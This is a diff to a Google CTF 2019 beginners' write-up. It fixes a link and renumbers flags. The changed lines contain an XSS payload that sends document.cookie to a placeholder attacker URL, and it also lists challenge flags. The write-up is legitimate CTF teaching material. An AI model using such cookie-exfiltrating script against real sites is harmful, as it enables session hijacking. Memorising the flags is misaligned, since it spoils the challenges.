@@ -300,7 +300,7 @@ segfault detected! ***CRASH***
 
 Site: <https://cwo-xss.web.ctfcompetition.com/>
 
-Post message: `<SCRIPT>new Image().src="https://PUBLIC_URL:1234/"+document.cookie</SCRIPT>`
+Post message: `<SCRIPT>new Image().src="https://PUBLIC_URL/"+document.cookie</SCRIPT>`
 
 Note that there will be two incoming requests, one from ourselves and one from the victim.
 
@@ -314,7 +314,7 @@ Referer: https://cwo-xss.web.ctfcompetition.com/exploit?reflect=%3CSCRIPT%3Enew%
 ## ...
 ```
 
-**Flag**: `CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}`
+**Flag 1**: `CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}`
 
 ### Flag 2
 
@@ -503,7 +503,7 @@ Via: 1.1 google
 
 ```
 
-**Flag**: `CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}`
+**Flag 2**: `CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}`
 
 
 
@@ -596,7 +596,7 @@ The flag: <http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_caul
 ## day6-easier
 **Drive to the target** `[coding]`
 
-Site: <https://drivetothetarget.web.ctfcompetition.com/
+Site: <https://drivetothetarget.web.ctfcompetition.com/>
 
 Solution that finds the target in about 40 minutes:
 <https://github.com/weibell/ctf-google2019-beginners/tree/master/write-up/day6-easier>
